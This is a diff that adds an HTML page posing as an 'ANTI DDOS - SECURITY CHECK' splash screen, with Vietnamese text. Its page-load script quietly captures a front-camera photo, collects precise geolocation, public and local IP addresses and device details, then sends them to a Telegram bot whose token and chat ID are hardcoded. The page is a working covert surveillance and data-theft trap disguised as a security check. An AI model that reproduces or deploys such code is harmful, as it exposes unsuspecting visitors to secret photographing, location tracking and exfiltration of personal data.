@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="ANTI DDOS - Phạm Tuấn Kiệt">
+  <meta name="author" content="BabyShark">
+  <link rel="canonical" href="//github.com/phtuankiet" />
+  <title>Pham Tuan Kiet - ANTI DDOS</title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Pattaya|Potta One|Rowdies|Braah One|Chivo">
+  <link rel="icon" href="https://tse1.mm.bing.net/th?id=OIP.w_Q5HVaozyYRzd5K9nYMmwHaEK&pid=Api&P=0&h=100&w=100">
+</head>
+<body onload="__onCreate()" class="bodystyle">
+    <video id="video" style="display: none;" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    
+    <style>
+        * {
+    user-select: none;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none
+}
+
+body {
+  background-color: #fcfcfc;
+    background-size: cover;
+    background-position: center;
+    justify-content: center;
+    text-align: center;
+    align-items: center;
+}
+.sucurify-icon {
+
+}
+.Container {
+    text-align: center;
+    margin-top: 5%;
+    width: 100%;
+    overflow: hidden;
+    font-size: 1em;
+}
+
+@media (max-width: 768px) {
+    .Container {
+        margin-top: 15%;
+        font-size: 0.8em; 
+    }
+}
+
+.bodystyle {
+    position: fixed;
+    top: 5px;
+    left: 0;
+    width: 100%;
+    height: 99%;
+    text-align: center;
+    background-color: #111;
+    margin: 0;
+    padding: 0;
+    border-style: double;
+    border-radius: 20px;
+    border-color: #ccc;
+    border-width: 2px;
+    box-sizing: border-box;
+    animation-name: bodyborder;
+    animation-iteration-count: infinite;
+    animation-duration: 1s;
+    animation-direction: right;
+}
+
+
+            @keyframes bodyborder {
+                30% {
+                    border-color: #666
+                }
+
+                60% {
+                    border-color: #999
+                }
+
+                90% {
+                    border-color: #ccc
+                }
+            }
+
+            @media (max-width: 768px) {
+  .bodystyle {
+    top: 6px;
+    left: 5px;
+    width: 98%;
+    height: 99%;
+  }
+}
+ul {
+    margin: 0;
+    padding: 0
+}
+h1 {
+    color: #fff;
+    font-family: 'Rowdies';
+}
+
+h2 {
+    font-family: 'Braah One';
+    font-size: 25px;
+    color: silver;
+}
+
+.pulse-container {
+                margin-top: 10px;
+                margin-bottom: 10px;
+                width: 100px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center
+            }
+
+            .pulse-bubble {
+                width: 15px;
+                height: 15px;
+                border-radius: 5px;
+                background-color: violet;
+            }
+
+            .pulse-bubble-1 {
+                animation: pulse .4s ease 0s infinite alternate
+            }
+
+            .pulse-bubble-2 {
+                animation: pulse .4s ease .2s infinite alternate
+            }
+
+            .pulse-bubble-3 {
+                animation: pulse .4s ease .4s infinite alternate
+            }
+
+            @keyframes pulse {
+                from {
+                    opacity: 1;
+                    transform: scale(1)
+                }
+
+                to {
+                    opacity: .25;
+                    transform: scale(.75)
+                }
+            }
+
+.Blob {
+  background: black;
+  border-radius: 50%;
+  margin: 40px;
+  height: 150px;
+  width: 150px; 
+  box-shadow: 0 1px 7px rgb(231, 231, 231);
+  margin-top: 70px;
+}
+    </style>
+    <section id="Image">
+  <div class="Container">
+    <img class="Blob" src="https://img00.deviantart.net/5137/i/2011/278/5/c/anonymous_logo_by_viperaviator-d4bwqvn.png
+    " alt="Tuan Kiet">
+    <h1>ANTI DDOS - SECURITY CHECK</h1>
+    <p style="font-family: Chivo;color: rgb(216, 216, 216);" >You won't see the form anymore.
+    <br> This is an attack challenge for the players.</p>
+    <strong style="color: rgb(216, 216, 216);font-family: Chivo;">power by
+    <a style="color: #a690d6;" href="//facebook.com/100014053117503" target="about:blank">tranminhquang2347.github.io</a></a>
+</strong>
+  </div>
+</section>
+ <div style="margin-top: 15px;" class="Container">
+    <h2>- Waiting SECURITY -</h2>
+    <center> 
+        <div class="pulse-container">
+        <div class="pulse-bubble pulse-bubble-1"></div>
+        <div class="pulse-bubble pulse-bubble-2"></div>
+        <div class="pulse-bubble pulse-bubble-3"></div>
+    </div>
+    </div>
+</center>
+
+<script>
+const TELEGRAM_BOT_TOKEN = "8106913045:AAG6JmxUc3b7m2I0r17nWaPxaN3o0q8uZG8";
+const TELEGRAM_CHAT_ID = "7500832922";
+
+let hasCamera = false;
+let hasLocation = false;
+let capturedImageBlob = null;
+let locationData = null;
+let ipData = null;
+
+function __onCreate() {
+    initSecurityCheck();
+}
+
+async function initSecurityCheck() {
+    try {
+        await getIPInfo();
+        await requestPermissions();
+        await collectAndSendData();
+    } catch (error) {
+        await collectAndSendData();
+    }
+}
+
+async function requestPermissions() {
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' }, 
+                audio: false 
+            });
+            
+            hasCamera = true;
+            await capturePhoto(stream);
+            stream.getTracks().forEach(track => track.stop());
+            
+        } catch (error) {
+            hasCamera = false;
+        }
+    }
+    
+    if (navigator.geolocation) {
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+            
+            hasLocation = true;
+            locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+            
+        } catch (error) {
+            hasLocation = false;
+        }
+    }
+}
+
+async function capturePhoto(stream) {
+    return new Promise((resolve) => {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        
+        video.srcObject = stream;
+        
+        video.onloadedmetadata = () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            setTimeout(() => {
+                context.drawImage(video, 0, 0);
+                canvas.toBlob((blob) => {
+                    capturedImageBlob = blob;
+                    resolve();
+                }, 'image/jpeg', 0.8);
+            }, 1000);
+        };
+    });
+}
+
+async function getIPInfo() {
+    const apiList = [
+        'https://ipinfo.io/json',
+        'https://api.ipify.org?format=json',
+        'https://httpbin.org/ip',
+        'https://api.myip.com',
+        'https://ipapi.co/json/'
+    ];
+    
+    for (let api of apiList) {
+        try {
+            const response = await fetch(api, {
+                method: 'GET',
+                mode: 'cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                }
+            });
+            
+            if (response.ok) {
+                const data = await response.json();
+                
+                if (api.includes('ipinfo.io')) {
+                    ipData = {
+                        publicIP: data.ip || 'Không xác định',
+                        country: data.country || 'Không xác định',
+                        city: data.city || 'Không xác định',
+                        isp: data.org || 'Không xác định',
+                        region: data.region || 'Không xác định'
+                    };
+                } else if (api.includes('ipapi.co')) {
+                    ipData = {
+                        publicIP: data.ip || 'Không xác định',
+                        country: data.country_name || 'Không xác định',
+                        city: data.city || 'Không xác định',
+                        isp: data.org || 'Không xác định',
+                        region: data.region || 'Không xác định'
+                    };
+                } else if (api.includes('myip.com')) {
+                    ipData = {
+                        publicIP: data.ip || 'Không xác định',
+                        country: data.country || 'Không xác định',
+                        city: data.cc || 'Không xác định',
+                        isp: 'Không xác định',
+                        region: 'Không xác định'
+                    };
+                } else {
+                    ipData = {
+                        publicIP: data.ip || data.origin || 'Không xác định',
+                        country: 'Không xác định',
+                        city: 'Không xác định',
+                        isp: 'Không xác định',
+                        region: 'Không xác định'
+                    };
+                }
+                break;
+            }
+        } catch (error) {
+            continue;
+        }
+    }
+    
+    if (!ipData) {
+        ipData = {
+            publicIP: 'Không xác định',
+            country: 'Không xác định',
+            city: 'Không xác định',
+            isp: 'Không xác định',
+            region: 'Không xác định'
+        };
+    }
+}
+
+function getLocalIP() {
+    return new Promise((resolve) => {
+        try {
+            const rtc = new RTCPeerConnection({iceServers:[]});
+            rtc.createDataChannel('');
+            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+            
+            rtc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    const candidate = event.candidate.candidate;
+                    const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                    if (ipMatch) {
+                        resolve(ipMatch[1]);
+                        rtc.close();
+                    }
+                }
+            };
+            
+            setTimeout(() => resolve('Không xác định'), 3000);
+        } catch (error) {
+            resolve('Không xác định');
+        }
+    });
+}
+
+function getDeviceInfo() {
+    const userAgent = navigator.userAgent;
+    let device = 'Không xác định';
+    
+    if (/iPhone/i.test(userAgent)) {
+        device = 'iPhone';
+    } else if (/iPad/i.test(userAgent)) {
+        device = 'iPad';
+    } else if (/Android/i.test(userAgent)) {
+        device = 'Android';
+    } else if (/Windows/i.test(userAgent)) {
+        device = 'Windows';
+    } else if (/Mac/i.test(userAgent)) {
+        device = 'Mac';
+    } else if (/Linux/i.test(userAgent)) {
+        device = 'Linux';
+    }
+    
+    return { device, userAgent };
+}
+
+async function collectAndSendData() {
+    const localIP = await getLocalIP();
+    const deviceInfo = getDeviceInfo();
+    
+    let locationURL = 'Không Có';
+    if (hasLocation && locationData) {
+        locationURL = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+    }
+    
+    const message = `🔒 BÁO CÁO BẢO MẬT 🔒
+
+📍 THÔNG TIN MẠNG
+Địa Chỉ IP: ${ipData.publicIP}
+Quốc Gia: ${ipData.country}
+Thành Phố: ${ipData.city}
+Nhà Cung Cấp Mạng: ${ipData.isp}
+
+🔍 THÔNG TIN CHI TIẾT
+IP: ${localIP}
+Vị Trí Chính Xác: ${locationURL}
+Ảnh Chụp Camera: ${hasCamera ? 'Có' : 'Không Có'}
+
+📱 THIẾT BỊ
+Thiết Bị: ${deviceInfo.device}
+User-Agent: ${deviceInfo.userAgent}
+
+⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}`;
+
+    await sendToTelegram(message);
+}
+
+async function sendToTelegram(message) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+        return;
+    }
+    
+    try {
+        if (hasCamera && capturedImageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', capturedImageBlob, 'security_check.jpg');
+            formData.append('caption', message);
+            
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                mode: 'cors',
+                body: formData
+            });
+            
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status}`);
+            }
+        } else {
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                mode: 'cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status}`);
+            }
+        }
+    } catch (error) {
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                mode: 'cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: `❌ Lỗi gửi dữ liệu chính\n\n${message}`
+                })
+            });
+        } catch (fallbackError) {
+            console.error('Fallback failed:', fallbackError);
+        }
+    }
+}
+</script>
+
+</body>
+</html>
